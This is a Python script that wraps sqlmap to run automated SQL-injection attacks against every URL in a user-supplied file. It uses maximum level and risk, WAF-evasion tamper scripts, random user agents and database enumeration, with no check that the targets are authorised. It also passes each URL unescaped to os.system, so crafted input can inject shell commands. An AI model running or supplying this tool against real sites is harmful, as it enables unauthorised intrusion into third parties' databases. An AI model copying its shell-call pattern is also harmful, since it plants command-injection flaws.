import os

def run_sqlmap(urls, force_ssl):
    for url in urls:
        # Construct the base command
        command = f"sqlmap -u {url} --level=5 --risk=3 --tamper=randomcase,space2hash,between --batch --dbs --random-agent"
        
        # Add the --force-ssl option if the user said 'yes'
        if force_ssl:
            command += " --force-ssl"
        
        print(f"Running: {command}")
        os.system(command)

def main():
    # Ask for the input file
    file_path = input("Enter the path to the file with URLs: ")
    
    # Read URLs from the file
    try:
        with open(file_path, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return
    
    # Ask if --force-ssl should be added
    force_ssl = input("Do you want to add --force-ssl? (https) (y/n): ").strip().lower() == 'y'
    
    # Run sqlmap for each URL
    run_sqlmap(urls, force_ssl)

if __name__ == "__main__":
    main()
